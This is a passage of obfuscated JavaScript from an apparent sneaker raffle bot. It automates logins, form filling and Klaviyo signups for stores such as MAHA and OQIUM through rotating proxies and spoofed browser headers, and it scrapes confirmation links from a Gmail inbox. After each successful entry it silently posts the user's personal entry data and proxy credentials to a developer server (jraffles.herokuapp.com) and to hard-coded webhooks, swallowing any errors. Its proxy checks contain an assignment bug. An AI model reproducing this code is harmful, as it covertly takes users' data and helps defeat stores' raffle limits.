                        if (_0x4b1e6b['useRandomProxy'] = ![])
                            var _0x553a42 = _0x5682c7[_0x4d7485]['split'](':');
                        else
                            var _0x571661 = Math['round'](Math['random']() * (_0x5682c7['length'] - 0x1)), _0x553a42 = _0x5682c7[_0x571661]['split'](':');
                        var _0x524b3e;
                        try {
                            _0x524b3e = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x553a42[0x0] + ':' + _0x553a42[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x524b3e = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x553a42[0x0] + ':' + _0x553a42[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xc6871b = await _0x524b3e['newPage']();
                            await _0xc6871b['authenticate']({
                                'username': '' + _0x553a42[0x2],
                                'password': '' + _0x553a42[0x3]
                            }), console['log'](_0x4786af() + '\x20[' + _0x1ef492['name'] + ']\x20Task\x20' + (_0x4d7485 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xc6871b['setRequestInterception'](!![]), _0xc6871b['on']('request', _0x46cc47 => {
                                _0x46cc47['resourceType']() === 'image' || _0x46cc47['resourceType']() === 'font' || _0x46cc47['resourceType']() === 'media' ? _0x46cc47['abort']() : _0x46cc47['continue']();
                            }), await _0xc6871b['goto']('' + _0x26cfe4[_0x4d7485]['Url'], { 'waitUntil': 'networkidle2' }), await _0x590479(0x12c), await _0xc6871b['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xc6871b['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x590479(0x7d0);
                            try {
                                await _0xc6871b['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0xc6871b['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x4786af() + '\x20[' + _0x1ef492['name'] + ']\x20Task\x20' + (_0x4d7485 + 0x1) + '\x20:\x20Logging\x20in'), await _0xc6871b['waitForSelector']('#username'), await _0xc6871b['type']('#username', _0x26cfe4[_0x4d7485]['Email']), await _0xc6871b['waitForSelector']('#password'), await _0xc6871b['type']('#password', _0x26cfe4[_0x4d7485]['Password']), await _0x590479(0x190), await _0xc6871b['click']('#buttonSubmit'), await _0xc6871b['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x4786af() + '\x20[' + _0x1ef492['name'] + ']\x20Task\x20' + (_0x4d7485 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x590479(0x1f4), console['log'](_0x4786af() + '\x20[' + _0x1ef492['name'] + ']\x20Task\x20' + (_0x4d7485 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x26cfe4[_0x4d7485]['Size']);
                            let _0x3cbba3 = _0x26cfe4[_0x4d7485]['Size']['replace']('.5', '\x201/2');
                            if (_0x3cbba3['toUpperCase']() == 'RANDOM') {
                                const _0x5292ab = await _0xc6871b['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x45e92f = Math['round'](Math['random']() * (_0x5292ab['length'] - 0x1));
                                await _0x5292ab[_0x45e92f]['click']();
                            } else
                                await _0xc6871b['click']('button[aria-label=\x22' + _0x3cbba3 + '\x22]');
                            await _0x590479(0x1f4);
                            try {
                                await _0xc6871b['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x590479(0x12c), console['log'](_0x4786af() + '\x20[' + _0x1ef492['name'] + ']\x20Task\x20' + (_0x4d7485 + 0x1) + '\x20:\x20Filling\x20Information'), await _0xc6871b['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x590479(0x12c), await _0xc6871b['type']('#dwfrm_raffle_addressFields_firstName', _0x26cfe4[_0x4d7485]['FirstName']), await _0x590479(0x12c), await _0xc6871b['type']('#dwfrm_raffle_addressFields_lastName', _0x26cfe4[_0x4d7485]['LastName']), await _0x590479(0x12c), await _0xc6871b['select']('#dwfrm_raffle_addressFields_country', _0x26cfe4[_0x4d7485]['Country']), await _0x590479(0x12c), await _0xc6871b['type']('#dwfrm_raffle_addressFields_city', _0x26cfe4[_0x4d7485]['City']), await _0x590479(0x12c);
                            _0x26cfe4[_0x4d7485]['Postcode'] == undefined && (_0x26cfe4[_0x4d7485]['Postcode'] = _0x26cfe4[_0x4d7485]['Zip']);
                            await _0xc6871b['type']('#dwfrm_raffle_addressFields_postalCode', _0x26cfe4[_0x4d7485]['Postcode']), await _0x590479(0x12c), await _0xc6871b['type']('#dwfrm_raffle_addressFields_address1', _0x26cfe4[_0x4d7485]['Address1']), await _0x590479(0x12c), await _0xc6871b['type']('#dwfrm_raffle_addressFields_address2', _0x26cfe4[_0x4d7485]['HouseNumber']), await _0x590479(0x12c), await _0xc6871b['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x26cfe4[_0x4d7485]['Address2']), await _0x590479(0x12c), await _0xc6871b['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x590479(0x12c), await _0xc6871b['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x26cfe4[_0x4d7485]['Follower']), await _0x590479(0x1f4), await _0xc6871b['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x590479(0x1f4), console['log'](_0x4786af() + '\x20[' + _0x1ef492['name'] + ']\x20Task\x20' + (_0x4d7485 + 0x1) + '\x20:\x20' + _0x4fb298['blue']('Awaiting\x20Paypal\x20Payment')), await _0xc6871b['click']('.b-paypal_button');
                            try {
                                await _0xc6871b['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x3b53a0 = 'no', _0x491fd3(_0x26cfe4[_0x4d7485], _0x1ef492), console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0x1ef492['name'] + ']\x20Task\x20' + (_0x4d7485 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x194912['succesDEVMSG']);
                                await _0x590479(0xc8), await _0x1690f0(_0x4f7f5d, _0x194912['succesDEVMSG']), await _0x590479(0xc8), await _0x1690f0(_0x4807c3, _0x194912['succesPUBMSG']);
                                let _0x5582ed = _0x26cfe4[_0x4d7485];
                                try {
                                    prxdata = {
                                        'username': _0x3d4e83['replace']('#', ''),
                                        'module': _0x1ef492['name'],
                                        'entrydata': JSON['stringify'](_0x5582ed),
                                        'proxy': '' + _0x5682c7[_0x4d7485]
                                    };
                                    var _0x4a840c = JSON['stringify'](prxdata);
                                    let _0x5c8d77 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x49fa88['post']('https://jraffles.herokuapp.com/success', _0x4a840c, _0x5c8d77);
                                } catch (_0x57a15a) {
                                }
                            } catch (_0x37f496) {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x1ef492['name'] + ']\x20Task\x20' + (_0x4d7485 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x37f496)), _0x2850f3 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x37f496;
                                var _0x414ef0 = await _0x54f36f(_0x26cfe4[_0x4d7485], _0x1ef492, 'dev', !![], _0x2850f3);
                                _0x194912['errorDEV'] = { 'embeds': [_0x414ef0] }, _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x194912['errorDEV']), await _0x1690f0(_0x874ee1, _0x194912['errorDEV']);
                            }
                        } catch (_0x14da71) {
                            console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x1ef492['name'] + ']\x20Task\x20' + (_0x4d7485 + 0x1) + '\x20:\x20' + _0x14da71)), _0x2850f3 = '' + _0x14da71;
                            var _0x414ef0 = await _0x54f36f(_0x26cfe4[_0x4d7485], _0x1ef492, 'dev', !![], _0x2850f3);
                            _0x194912['errorDEV'] = { 'embeds': [_0x414ef0] }, _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x194912['errorDEV']), await _0x1690f0(_0x874ee1, _0x194912['errorDEV']), _0x3b53a0 = 'yes';
                        } finally {
                            _0x524b3e && _0x524b3e['close']();
                            if (_0x3b53a0 == 'yes' && _0x43f8d0 != 0x5) {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x1ef492['name'] + ']\x20Task\x20' + (_0x4d7485 + 0x1) + '\x20:\x20Retrying\x20(' + _0x43f8d0 + '\x20/\x205)')), _0x4d7485 = _0x4d7485 - 0x1, _0x43f8d0 = _0x43f8d0 + 0x1;
                                continue;
                            }
                            _0x3b53a0 == 'yes' && _0x43f8d0 >= 0x5 && (_0x549c32(_0x26cfe4[_0x4d7485], _0x1ef492), _0x3b53a0 = 'no', _0x43f8d0 = 0x0), console['log']('Waiting\x20for\x20' + _0x4b1e6b['AfewDelay'] + '\x20ms'), await _0x590479(_0x4b1e6b['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x1849f4, _0x29960f, _0x41214f) {
                    for (var _0x1b5082 = 0x0; _0x1b5082 < _0x29960f['length']; _0x1b5082++) {
                        try {
                            await _0x46b8ee(_0x29960f, _0x1b5082);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x2d0e82(_0x55a3b2, _0x35c3b5, _0x27fae0, _0x317955, _0x44bf56) {
                            var _0x334e4b, _0x1c875f = {}, _0x3eec56 = [], _0x4b2d48 = {}, _0x2f5c5c = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x858585 = Math['round'](Math['random']() * (_0x2f5c5c['length'] - 0x1));
                            !_0x317955 && (_0x317955 = {});
                            if (_0x35c3b5 != 'ver') {
                                _0x39f641(_0x27fae0['name'] + '\x20Task\x20' + (_0x55a3b2 + 0x1) + '\x20/\x20' + _0x317955['length'] + '\x20||\x20File:\x20' + _0x4c637b + '\x20Proxies:\x20' + _0x1792f9), await _0x46b8ee(_0x317955, _0x55a3b2), _0x1c875f = _0x27fae0['data'], _0x1c875f['data']['attributes']['email'] = '' + _0x317955[_0x55a3b2]['Email'];
                                if (_0x317955[_0x55a3b2]['Size'] == 'RANDOM') {
                                }
                                _0x1c875f['data']['attributes']['properties']['$first_name'] = '' + _0x317955[_0x55a3b2]['FirstName'], _0x1c875f['data']['attributes']['properties']['$last_name'] = '' + _0x317955[_0x55a3b2]['LastName'], _0x1c875f['data']['attributes']['properties']['$address1'] = _0x317955[_0x55a3b2]['Address1'] + '\x20' + _0x317955[_0x55a3b2]['Address2'] + '\x20' + _0x317955[_0x55a3b2]['HouseNumber'], _0x1c875f['data']['attributes']['properties']['$zip'] = '' + _0x317955[_0x55a3b2]['Zip'], _0x1c875f['data']['attributes']['properties']['$city'] = '' + _0x317955[_0x55a3b2]['City'], _0x1c875f['data']['attributes']['properties']['$country'] = '' + _0x317955[_0x55a3b2]['Country'], _0x317955[_0x55a3b2]['Size'] == 'RANDOM' ? _0x1c875f['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x2f5c5c[_0x858585] : _0x1c875f['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x317955[_0x55a3b2]['Size'], _0x1c875f['data']['attributes']['properties']['$phone_number'] = '' + _0x317955[_0x55a3b2]['Phone'], _0x1c875f['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x317955[_0x55a3b2]['Follower'];
                            }
                            if (_0x4b1e6b['useRandomProxy'] = ![])
                                var _0x2fff8c = _0x44bf56[_0x55a3b2]['split'](':');
                            else
                                var _0x36aa6b = Math['round'](Math['random']() * (_0x44bf56['length'] - 0x1)), _0x2fff8c = _0x44bf56[_0x36aa6b]['split'](':');
                            var _0x9f4f53 = {
                                'jar': _0x456e65,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x27fae0['url'],
                                'headers': _0x27fae0['headers'],
                                'body': JSON['stringify'](_0x1c875f),
                                'proxy': 'http://' + _0x2fff8c[0x2] + ':' + _0x2fff8c[0x3] + '@' + _0x2fff8c[0x0] + ':' + _0x2fff8c[0x1]
                            };
                            return _0x35c3b5 != 'ver' && (_0x9f4f53['url'] = _0x27fae0['url'], _0x9f4f53['headers'] = _0x27fae0['headers']), _0x35c3b5 == 'ver' && (_0x9f4f53['method'] = 'GET'), new Promise(function (_0x17fd12, _0x3db8c7) {
                                callback = async (_0x1759f7, _0x3f989f, _0xa99ebc) => {
                                    if (!_0x1759f7 && _0x3f989f['statusCode'] == 0xca || !_0x1759f7 && _0x3f989f['statusCode'] == 0xc8) {
                                        if (_0x35c3b5 != 'ver') {
                                            var _0x34f8cc = await _0x54f36f(_0x317955[_0x55a3b2], _0x27fae0, 'dev', ![]), _0x11d13e = await _0x54f36f(_0x317955[_0x55a3b2], _0x27fae0, 'pub', ![]);
                                            const _0x1572fa = {
                                                'succesDEVMSG': { 'embeds': [_0x34f8cc] },
                                                'succesPUBMSG': { 'embeds': [_0x11d13e] }
                                            };
                                            let _0x26ce00 = _0x317955[_0x55a3b2];
                                            try {
                                                prxdata = {
                                                    'username': _0x3d4e83['replace']('#', ''),
                                                    'module': _0x27fae0['name'],
                                                    'entrydata': JSON['stringify'](_0x26ce00),
                                                    'proxy': '' + _0x44bf56[_0x55a3b2]
                                                };
                                                var _0x3a1764 = JSON['stringify'](prxdata);
                                                let _0x19abe3 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x49fa88['post']('https://jraffles.herokuapp.com/success', _0x3a1764, _0x19abe3);
                                            } catch (_0x2a88ab) {
                                            }
                                            if (_0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '')
                                                try {
                                                    await _0x1690f0(_0x4b1e6b['webhook'], _0x1572fa['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x590479(0xc8), await _0x1690f0(_0x4f7f5d, _0x1572fa['succesDEVMSG']), await _0x590479(0xc8);
                                            try {
                                                await _0x1690f0(_0x4807c3, _0x1572fa['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x491fd3(_0x317955[_0x55a3b2], _0x27fae0);
                                        }
                                        _0x17fd12(console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0x27fae0['name'] + ']\x20Task\x20' + (_0x55a3b2 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x35c3b5 != 'ver') {
                                            var _0x437137 = '' + _0x1759f7, _0x2e0941 = await _0x54f36f(_0x317955[_0x55a3b2], _0x27fae0, 'dev', !![], _0x437137), _0x5b55ba = {};
                                            _0x5b55ba['errorDEV'] = { 'embeds': [_0x2e0941] }, _0x549c32(_0x317955[_0x55a3b2], _0x27fae0), _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x5b55ba['errorDEV']), await _0x1690f0(_0x874ee1, _0x5b55ba['errorDEV']);
                                        }
                                        _0x3db8c7(console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x27fae0['name'] + ']\x20Task\x20' + (_0x55a3b2 + 0x1) + ':\x20' + _0x1759f7)));
                                    }
                                };
                                try {
                                    _0x35c3b5 != 'ver' && console['log'](_0x4786af() + '\x20[' + _0x27fae0['name'] + ']\x20Task\x20' + (_0x55a3b2 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1c875f['data']['attributes']['email']), _0x589558(_0x9f4f53, callback);
                                } catch (_0x462ce9) {
                                    console['log'](_0x4786af() + '\x20Task\x20' + (_0x55a3b2 + 0x1) + ':\x20' + _0x462ce9);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x2d0e82(_0x1b5082, 'nor', _0x1849f4, _0x29960f, _0x41214f), console['log'](_0x4786af() + '\x20[' + _0x1849f4['name'] + ']\x20Sleeping\x20for\x20' + _0x4b1e6b['delay'] + '\x20ms'), await _0x590479(_0x4b1e6b['delay']);
                        } catch (_0x51cfda) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0xdf9ddc, _0x2a2ec9, _0x442c89) {
                    var _0x33962a = [], _0x18a342 = ![];
                    async function _0x23d292() {
                        var _0xda9d42 = new _0x54228e({
                            'user': _0x4b1e6b['masterMail'],
                            'password': _0x4b1e6b['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x28c74d(_0x489937) {
                            _0xda9d42['openBox']('INBOX', ![], _0x489937);
                        }
                        _0xda9d42['once']('ready', function () {
                            _0x28c74d(function (_0x23dab4, _0x29c098) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x23dab4)
                                    throw _0x23dab4;
                                _0xda9d42['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x17a93e, _0x4d34a9) {
                                    if (!_0x4d34a9 || !_0x4d34a9['length'])
                                        console['log'](_0x4786af() + '\x20[' + _0xdf9ddc['name'] + ']\x20No\x20mails\x20found'), _0xda9d42['end']();
                                    else {
                                        var _0x32a935 = _0xda9d42['seq']['fetch'](_0x4d34a9, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x32a935['on']('message', function (_0x10f2ae, _0x386075) {
                                            var _0x588e09 = '(#' + _0x386075 + ')\x20';
                                            _0x10f2ae['on']('body', function (_0x25d931, _0x1e083d) {
                                                _0x4a3e33(_0x25d931, (_0x5215fe, _0x46471e) => {
                                                    var _0x315909 = _0x46471e['text']['split']('(')[0x1], _0x305439 = _0x315909['split'](')')[0x0];
                                                    _0x33962a['push'](_0x305439);
                                                });
                                            }), _0x10f2ae['once']('end', function () {
                                            });
                                        }), _0x32a935['once']('error', function (_0x51fbc1) {
                                            console['log']('Fetch\x20error:\x20' + _0x51fbc1), _0x18a342 = !![];
                                        }), _0x32a935['once']('end', function () {
                                            _0xda9d42['end']();
                                        });
                                    }
                                });
                            });
                        }), _0xda9d42['once']('error', function (_0x1e9474) {
                            console['log'](_0x4fb298['red'](_0x1e9474['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x18a342 = !![];
                        }), _0xda9d42['once']('end', async function () {
                            _0x18a342 = !![];
                        }), _0xda9d42['connect']();
                    }
                    async function _0x5f17dc(_0x4bf430, _0x2ccfb8, _0x1ff6ed) {
                        for (var _0x559f97 = 0x0; _0x559f97 < _0x2ccfb8['length']; _0x559f97++) {
                            async function _0x42c47e(_0x11da00, _0x24a3d4, _0xf1d871, _0x3c6521, _0xe7a9f7) {
                                var _0x4c892d, _0x28761e = {}, _0x30f386 = [], _0xe3d8f5 = {}, _0x17bc9a = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x47bc75 = Math['round'](Math['random']() * (_0x17bc9a['length'] - 0x1));
                                _0x3c6521[_0x11da00]['Size'] == 'RANDOM' && (_0x3c6521[_0x11da00]['Size'] = _0x17bc9a[_0x47bc75]);
                                !_0x3c6521 && (_0x3c6521 = {});
                                if (_0x4b1e6b['useRandomProxy'] = ![])
                                    var _0xf4d3f4 = _0xe7a9f7[_0x11da00]['split'](':');
                                else
                                    var _0x41f099 = Math['round'](Math['random']() * (_0xe7a9f7['length'] - 0x1)), _0xf4d3f4 = _0xe7a9f7[_0x41f099]['split'](':');
                                var _0x1870f0 = {
                                    'jar': _0x456e65,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0xf1d871['url'],
                                    'headers': _0xf1d871['headers'],
                                    'body': JSON['stringify'](_0x28761e),
                                    'proxy': 'http://' + _0xf4d3f4[0x2] + ':' + _0xf4d3f4[0x3] + '@' + _0xf4d3f4[0x0] + ':' + _0xf4d3f4[0x1]
                                };
                                return _0x24a3d4 != 'ver' && (_0x1870f0['url'] = _0xf1d871['url'], _0x1870f0['headers'] = _0xf1d871['headers']), _0x24a3d4 == 'ver' && (_0x1870f0['method'] = 'GET', _0x1870f0['url'] = _0x3c6521[_0x11da00]), new Promise(function (_0x494a94, _0x159d70) {
                                    callback = async (_0x9c4072, _0xd88a42, _0x2cf5f2) => {
                                        if (!_0x9c4072 && _0xd88a42['statusCode'] == 0xca || !_0x9c4072 && _0xd88a42['statusCode'] == 0xc8) {
                                            if (_0x24a3d4 != 'ver') {
                                                var _0x17d2eb = await _0x54f36f(_0x3c6521[_0x11da00], _0xf1d871, 'dev', ![]), _0x28d0e6 = await _0x54f36f(_0x3c6521[_0x11da00], _0xf1d871, 'pub', ![]);
                                                const _0x2635f3 = {
                                                    'succesDEVMSG': { 'embeds': [_0x17d2eb] },
                                                    'succesPUBMSG': { 'embeds': [_0x28d0e6] }
                                                };
                                                if (_0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '')
                                                    try {
                                                        await _0x1690f0(_0x4b1e6b['webhook'], _0x2635f3['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x590479(0xc8), await _0x1690f0(_0x4f7f5d, _0x2635f3['succesDEVMSG']), await _0x590479(0xc8);
                                                try {
                                                    await _0x1690f0(_0x4807c3, _0x2635f3['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x491fd3(_0x3c6521[_0x11da00], _0xf1d871);
                                            }
                                            _0x494a94(console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0xf1d871['name'] + ']\x20Task\x20' + (_0x11da00 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x24a3d4 != 'ver') {
                                                var _0x391135 = '' + _0x9c4072, _0x34bdcb = await _0x54f36f(_0x3c6521[_0x11da00], _0xf1d871, 'dev', !![], _0x391135), _0x31b11b = {};
                                                _0x31b11b['errorDEV'] = { 'embeds': [_0x34bdcb] }, _0x549c32(_0x3c6521[_0x11da00], _0xf1d871), _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x31b11b['errorDEV']), await _0x1690f0(_0x874ee1, _0x31b11b['errorDEV']);
                                            }
                                            _0x159d70(console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0xf1d871['name'] + ']\x20Task\x20' + (_0x11da00 + 0x1) + ':\x20' + _0x9c4072)));
                                        }
                                    };
                                    try {
                                        _0x24a3d4 != 'ver' ? console['log'](_0x4786af() + '\x20[' + _0xf1d871['name'] + ']\x20Task\x20' + (_0x11da00 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x28761e['data']['attributes']['email']) : console['log'](_0x4786af() + '\x20[' + _0xf1d871['name'] + ']\x20Task\x20' + (_0x11da00 + 0x1) + ':\x20Fetching\x20Response'), _0x589558(_0x1870f0, callback);
                                    } catch (_0x17dcf8) {
                                        console['log'](_0x4786af() + '\x20Task\x20' + (_0x11da00 + 0x1) + ':\x20' + _0x17dcf8);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x42c47e(_0x559f97, 'ver', _0x4bf430, _0x2ccfb8, _0x1ff6ed), console['log'](_0x4786af() + '\x20[' + _0x4bf430['name'] + ']\x20Sleeping\x20for\x20' + _0x4b1e6b['delay'] + '\x20ms'), await _0x590479(_0x4b1e6b['delay']);
                            } catch (_0x3285ac) {
                            }
                        }
                    }
                    try {
                        _0x23d292();
                        while (!_0x18a342) {
                            await _0x590479(0xbb8);
                        }
                        console['log']('Found\x20' + _0x33962a['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x590479(0x9c4);
                    }
                    await _0x5f17dc(_0xdf9ddc, _0x33962a, _0x442c89);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RVHsXu',
                            'custom_source': 'DH6927-017',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'ScxJcu',
                                '$consent_form_version': 0x8c005b,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
